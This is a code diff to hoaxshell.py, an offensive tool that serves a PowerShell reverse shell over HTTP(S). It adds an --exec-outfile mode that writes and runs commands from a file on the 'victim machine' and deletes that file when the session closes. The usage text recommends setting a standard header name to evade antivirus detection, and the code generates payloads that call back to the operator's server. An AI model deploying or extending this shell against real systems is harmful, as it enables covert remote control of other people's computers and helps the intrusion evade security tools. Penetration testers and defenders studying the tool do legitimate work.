@@ -48,8 +48,12 @@ Usage examples:
       
   - Recommended usage to avoid detection (over http):
 	  
-     # Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. Use -H to provide a standard or custom http header name to avoid detection.
+     # Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. 
+     # Use -H to provide a standard or custom http header name to avoid detection.
      sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
+     
+     # The same but with --exec-outfile (-x)
+     sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1"
 
   - Encrypted shell session (https):
 	  
@@ -59,7 +63,8 @@ Usage examples:
   
   - Encrypted shell session with a trusted certificate:
   
-	  sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
+     sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
+
 
 '''
 )
@@ -71,6 +76,7 @@ parser.add_argument("-p", "--port", action="store", help = "Your hoaxshell serve
 parser.add_argument("-f", "--frequency", action="store", help = "Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s).", type = float)
 parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility.")
 parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
+parser.add_argument("-x", "--exec-outfile", action="store", help = "Provide a filename (absolute path) on the victim machine to write and execute commands from instead of using \"Invoke-Expression\". The path better be quoted. Be careful when using special chars in the path (e.g. $env:USERNAME) as they must be properly escaped. See usage examples for details. CAUTION: you won't be able to change directory with this method. Your commands must include ablsolute paths to files etc.")
 parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded.")
 parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
 parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (default: false).")
@@ -145,8 +151,8 @@ def promptHelpMsg():
 	\r  Command                    Description
 	\r  -------                    -----------
 	\r  help                       Print this message.
-	\r  payload                    Print payload again (base64).
-	\r  rawpayload                 Print payload again (raw).
+	\r  payload                    Print payload (base64).
+	\r  rawpayload                 Print payload (raw).
 	\r  clear                      Clear screen.
 	\r  exit/quit/q                Close session and exit.
 	''')
@@ -177,7 +183,7 @@ def checkPulse(stop_event):
 		timestamp = int(datetime.now().timestamp())
 		tlimit = frequency + 10
 
-		if Hoaxshell.execution_verified:
+		if Hoaxshell.execution_verified and Hoaxshell.prompt_ready:
 			if abs(Hoaxshell.last_received - timestamp) > tlimit:
 				print(f'\r[{WARN}] Session has been idle for more than {tlimit} seconds. Shell probably died.')
 				Hoaxshell.prompt_ready = True
@@ -220,6 +226,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
 	SESSIONID = '-'.join([verify, get_cmd, post_res])
 	server_version = 'Apache/2.4.1' if not args.server_version else args.server_version
+	init_dir = None
 
 
 	def do_GET(self):
@@ -270,6 +277,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			session_check.start()
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}') #end = ''
+			print(f'\r[{IMPORTANT}] You can\'t change dir while utilizing --exec-outfile (-x) option. Your commands must include absolute paths to files, etc.') if args.exec_outfile else chill()
 			Hoaxshell.prompt_ready = False
 			Hoaxshell.command_pool.append(f"echo `r;pwd")
 			Hoaxshell.rst_promt_required = True
@@ -330,10 +338,21 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						output = b_array.decode('utf-8', 'ignore')
 						tmp = output.rsplit("Path", 1)
 						output = tmp[0]
-						p = tmp[-1].strip().rsplit("\n")[-1]
-						p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
 						junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
 						output = output.rsplit("Drive", 1)[0] if junk else output
+						
+						if Hoaxshell.init_dir == None:
+							p = tmp[-1].strip().rsplit("\n")[-1]
+							p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
+							Hoaxshell.init_dir = p
+													
+						if not args.exec_outfile:						
+							p = tmp[-1].strip().rsplit("\n")[-1]
+							p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
+							
+						else:
+							p = Hoaxshell.init_dir
+							
 						prompt = f"PS {p} > "
 
 					except UnicodeDecodeError:
@@ -346,8 +365,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						output = output.strip() + '\n' if output.strip() != '' else output.strip()
 
 					print(f'\r{GREEN}{output}{END}')
-				else:
-					print(f'\r{ORANGE}No output.{END}')
+					
+				# ~ else:
+					# ~ print(f'\r{ORANGE}No output.{END}')
 					
 			except ConnectionResetError:
 				print(f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')
@@ -383,7 +403,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def dropSession():
 
 		print(f'\r[{WARN}] Closing session elegantly...')
-		Hoaxshell.command_pool.append('exit')
+		
+		if not args.exec_outfile:
+			Hoaxshell.command_pool.append('exit')
+		else:
+			Hoaxshell.command_pool.append(f'del {args.exec_outfile};exit')	
+			
 		sleep(frequency + 2.0)
 		print(f'[{WARN}] Session terminated.')
 		stop_event.set()
@@ -485,25 +510,26 @@ def main():
 				ssl_version=ssl.PROTOCOL_TLS
 			)
 
+
 		port = f':{server_port}' if server_port != 443 else ''
 
 		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
 		Hoaxshell_server.daemon = True
 		Hoaxshell_server.start()
-
-
+	
+		
 		# Generate payload
 		if not args.grab:
 			print(f'[{INFO}] Generating reverse shell payload...')
 			
 			if not ssl_support:
-				source = open(f'./http_payload.ps1', 'r') 
+				source = open('./http_payload.ps1', 'r') if not args.exec_outfile else open('./http_payload_outfile.ps1', 'r')
 			
 			elif ssl_support and args.trusted_domain:
-				source = open(f'./https_payload_trusted.ps1', 'r')
+				source = open('./https_payload_trusted.ps1', 'r') if not args.exec_outfile else open('./https_payload_trusted_outfile.ps1', 'r')
 				
 			elif ssl_support and not args.trusted_domain:
-				source = open(f'./https_payload.ps1', 'r')
+				source = open('./https_payload.ps1', 'r') if not args.exec_outfile else open('./https_payload_outfile.ps1', 'r')
 			
 			payload = source.read().strip()
 			source.close()
@@ -511,6 +537,9 @@ def main():
 			
 			if args.invoke_restmethod:
 				payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		
+
+			if args.exec_outfile:
+				payload = payload.replace("*OUTFILE*", args.exec_outfile)
 			
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
 
@@ -550,7 +579,9 @@ def main():
 				else:
 
 					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
+						
 						if user_input == "pwd": user_input = "split-path $pwd'\\0x00'"
+							
 						Hoaxshell.command_pool.append(user_input + f";pwd")
 						Hoaxshell.prompt_ready = False
 
